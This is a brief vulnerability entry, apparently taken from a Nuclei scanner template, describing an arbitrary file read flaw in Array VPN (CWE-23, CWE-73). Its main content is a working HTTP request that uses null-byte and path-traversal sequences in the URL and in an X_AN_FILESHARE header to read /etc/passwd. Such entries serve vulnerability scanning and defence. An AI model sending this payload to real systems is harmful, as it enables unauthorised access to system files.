# Vulnerability: Array VPN - Arbitrary File Reading Vulnerability
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`array-vpn-lfi.yaml`)

## Description
Array VPN Arbitrary File Reading Vulnerability

## Vulnerable Code Pattern / Exploit Payload
```http
GET /prx/000/http/localhost/client_sec/%00../../../addfolder HTTP/1.1
Host: {{Hostname}}
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X_AN_FILESHARE: uname=t; password=t; sp_uname=t; flags=c3248;fshare_template=../../../../../../../../etc/passwd
```

